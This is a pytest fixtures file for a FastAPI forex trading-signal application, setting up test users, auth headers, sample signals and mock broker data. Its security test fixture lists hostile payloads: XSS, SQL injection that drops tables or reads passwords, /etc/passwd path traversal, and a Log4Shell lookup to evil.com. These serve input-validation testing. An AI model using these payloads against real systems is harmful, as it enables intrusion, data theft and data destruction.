"""
Pytest configuration and fixtures for AI Trading System tests
"""

import asyncio
import pytest
import json
import os
from datetime import datetime, timedelta
from typing import Dict, Any, Generator, AsyncGenerator
from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker, Session
from sqlalchemy.pool import StaticPool

# Import the FastAPI app
import sys
sys.path.append("frontend")
from main import app
from database import engine, Base
from models import User, Signal
from app.services.auth_service import AuthService

# Test configuration
TEST_DATABASE_URL = "sqlite:///:memory:"

@pytest.fixture(scope="session")
def event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()

@pytest.fixture(scope="session")
def test_db():
    """Create test database"""
    engine = create_engine(
        TEST_DATABASE_URL,
        connect_args={"check_same_thread": False},
        poolclass=StaticPool,
    )
    Base.metadata.create_all(bind=engine)
    yield engine
    Base.metadata.drop_all(bind=engine)

@pytest.fixture
def db_session(test_db):
    """Create test database session"""
    TestingSessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=test_db)
    session = TestingSessionLocal()
    try:
        yield session
    finally:
        session.close()

@pytest.fixture
def client():
    """Create test client"""
    with TestClient(app) as client:
        yield client

@pytest.fixture
def test_user(db_session: Session):
    """Create test user"""
    user = User(
        username="testuser",
        email="test@example.com",
        full_name="Test User",
        is_active=True,
        is_admin=False,
        subscription_active=True,
        hashed_password=AuthService.get_password_hash("testpassword123")
    )
    db_session.add(user)
    db_session.commit()
    db_session.refresh(user)
    return user

@pytest.fixture
def test_admin(db_session: Session):
    """Create test admin user"""
    admin = User(
        username="testadmin",
        email="admin@example.com",
        full_name="Test Admin",
        is_active=True,
        is_admin=True,
        subscription_active=True,
        hashed_password=AuthService.get_password_hash("adminpassword123")
    )
    db_session.add(admin)
    db_session.commit()
    db_session.refresh(admin)
    return admin

@pytest.fixture
def auth_headers(client, test_user):
    """Create authentication headers for test user"""
    response = client.post("/token", data={
        "username": test_user.username,
        "password": "testpassword123"
    })
    token = response.json()["access_token"]
    return {"Authorization": f"Bearer {token}"}

@pytest.fixture
def admin_headers(client, test_admin):
    """Create authentication headers for admin user"""
    response = client.post("/token", data={
        "username": test_admin.username,
        "password": "adminpassword123"
    })
    token = response.json()["access_token"]
    return {"Authorization": f"Bearer {token}"}

@pytest.fixture
def test_signal(db_session: Session, test_user):
    """Create test signal"""
    signal = Signal(
        user_id=test_user.id,
        symbol="EURUSD",
        signal_type="BUY",
        entry_price=1.1000,
        stop_loss=1.0950,
        take_profit=1.1100,
        reliability=75.0,
        confidence_score=0.8,
        risk_level="MEDIUM",
        timeframe="H1",
        ai_analysis="Test AI analysis",
        position_size_suggestion=0.01,
        spread=0.0001,
        volatility=0.01,
        source="TEST",
        is_public=True,
        is_active=True
    )
    db_session.add(signal)
    db_session.commit()
    db_session.refresh(signal)
    return signal

@pytest.fixture
def test_signals_data():
    """Sample test signals data"""
    return [
        {
            "symbol": "EURUSD",
            "signal_type": "BUY",
            "entry_price": 1.1000,
            "stop_loss": 1.0950,
            "take_profit": 1.1100,
            "reliability": 75.0,
            "confidence_score": 0.8,
            "risk_level": "MEDIUM",
            "timeframe": "H1",
            "ai_analysis": "Test AI analysis for EURUSD",
            "position_size_suggestion": 0.01,
            "spread": 0.0001,
            "volatility": 0.01,
        },
        {
            "symbol": "GBPUSD",
            "signal_type": "SELL",
            "entry_price": 1.2500,
            "stop_loss": 1.2550,
            "take_profit": 1.2400,
            "reliability": 80.0,
            "confidence_score": 0.85,
            "risk_level": "HIGH",
            "timeframe": "H4",
            "ai_analysis": "Test AI analysis for GBPUSD",
            "position_size_suggestion": 0.02,
            "spread": 0.0002,
            "volatility": 0.015,
        },
        {
            "symbol": "USDJPY",
            "signal_type": "HOLD",
            "entry_price": 110.50,
            "stop_loss": 109.50,
            "take_profit": 112.00,
            "reliability": 65.0,
            "confidence_score": 0.7,
            "risk_level": "LOW",
            "timeframe": "D1",
            "ai_analysis": "Test AI analysis for USDJPY",
            "position_size_suggestion": 0.005,
            "spread": 0.05,
            "volatility": 0.008,
        }
    ]

@pytest.fixture
def mock_oanda_data():
    """Mock OANDA API responses"""
    return {
        "health": {
            "available": True,
            "environment": "practice",
            "last_check": datetime.utcnow().isoformat()
        },
        "market_data": {
            "instrument": "EUR_USD",
            "price": 1.1000,
            "bid": 1.0999,
            "ask": 1.1001,
            "spread": 0.0001,
            "timestamp": datetime.utcnow().isoformat()
        },
        "candles": {
            "instrument": "EUR_USD",
            "granularity": "H1",
            "candles": [
                {
                    "time": datetime.utcnow().isoformat(),
                    "open": 1.0990,
                    "high": 1.1010,
                    "low": 1.0980,
                    "close": 1.1000,
                    "volume": 1000
                }
            ]
        }
    }

@pytest.fixture
def rate_limit_data():
    """Rate limiting test data"""
    return {
        "max_attempts": 5,
        "window_minutes": 15,
        "test_ips": ["192.168.1.1", "192.168.1.2"]
    }

# Performance test fixtures
@pytest.fixture
def performance_thresholds():
    """Performance thresholds for tests"""
    return {
        "max_response_time_ms": 1000,
        "max_db_query_time_ms": 100,
        "max_cache_response_time_ms": 50,
        "min_success_rate": 0.95,
        "max_error_rate": 0.05
    }

@pytest.fixture
def load_test_config():
    """Load test configuration"""
    return {
        "concurrent_users": 10,
        "requests_per_user": 20,
        "ramp_up_time": 30,
        "duration": 120,
        "endpoints": [
            "/health",
            "/signals/latest",
            "/api/signals/latest"
        ]
    }

# Security test fixtures
@pytest.fixture
def security_test_data():
    """Security test data"""
    return {
        "malicious_payloads": [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "eval(base64_decode(''))"
        ],
        "invalid_tokens": [
            "invalid.jwt.token",
            "Bearer invalid",
            "Basic invalid",
            ""
        ],
        "sql_injection_attempts": [
            "1' OR '1'='1",
            "1; DROP TABLE users; --",
            "1 UNION SELECT username, password FROM users"
        ]
    }

# Integration test fixtures
@pytest.fixture
def integration_test_scenarios():
    """Integration test scenarios"""
    return {
        "user_registration_flow": [
            "POST /register",
            "POST /token",
            "GET /users/me",
            "GET /signals/latest"
        ],
        "signal_management_flow": [
            "POST /signals/",
            "GET /signals/my-signals",
            "PATCH /signals/{id}/close",
            "GET /signals/statistics"
        ],
        "admin_operations_flow": [
            "POST /admin/generate-signals",
            "GET /admin/users",
            "GET /config/info",
            "POST /cache/invalidate"
        ]
    }

# Error scenario fixtures
@pytest.fixture
def error_scenarios():
    """Error scenario test data"""
    return {
        "network_errors": [
            "ConnectionError",
            "TimeoutError",
            "HTTPError"
        ],
        "database_errors": [
            "ConnectionError",
            "OperationalError",
            "IntegrityError"
        ],
        "api_errors": [
            400, 401, 403, 404, 422, 429, 500
        ]
    }

# Environment-specific fixtures
@pytest.fixture
def test_environments():
    """Test environment configurations"""
    return {
        "development": {
            "base_url": "http://localhost:8000",
            "database_url": "sqlite:///dev_test.db",
            "debug": True
        },
        "testing": {
            "base_url": "http://localhost:8001",
            "database_url": "sqlite:///:memory:",
            "debug": False
        },
        "production": {
            "base_url": "https://api.cash-revolution.com",
            "database_url": os.getenv("DATABASE_URL"),
            "debug": False
        }
    }

# Test data generators
@pytest.fixture
def test_data_generator():
    """Test data generator fixture"""
    class TestDataGenerator:
        @staticmethod
        def generate_user_data(override_data: Dict[str, Any] = None) -> Dict[str, Any]:
            """Generate user test data"""
            import uuid
            data = {
                "username": f"testuser_{uuid.uuid4().hex[:8]}",
                "email": f"test_{uuid.uuid4().hex[:8]}@example.com",
                "password": "SecurePassword123!",
                "full_name": "Test Generated User"
            }
            if override_data:
                data.update(override_data)
            return data

        @staticmethod
        def generate_signal_data(override_data: Dict[str, Any] = None) -> Dict[str, Any]:
            """Generate signal test data"""
            import random
            symbols = ["EURUSD", "GBPUSD", "USDJPY", "AUDUSD", "USDCAD"]
            signal_types = ["BUY", "SELL", "HOLD"]
            risk_levels = ["LOW", "MEDIUM", "HIGH"]
            timeframes = ["M1", "M5", "M15", "M30", "H1", "H4", "D1"]

            data = {
                "symbol": random.choice(symbols),
                "signal_type": random.choice(signal_types),
                "entry_price": round(random.uniform(1.0, 150.0), 4),
                "stop_loss": round(random.uniform(0.8, 140.0), 4),
                "take_profit": round(random.uniform(1.2, 160.0), 4),
                "reliability": round(random.uniform(60.0, 95.0), 1),
                "confidence_score": round(random.uniform(0.6, 0.95), 2),
                "risk_level": random.choice(risk_levels),
                "timeframe": random.choice(timeframes),
                "ai_analysis": "Generated test AI analysis",
                "position_size_suggestion": round(random.uniform(0.01, 0.1), 3),
                "spread": round(random.uniform(0.1, 2.0), 2),
                "volatility": round(random.uniform(0.001, 0.05), 4),
            }
            if override_data:
                data.update(override_data)
            return data

    return TestDataGenerator()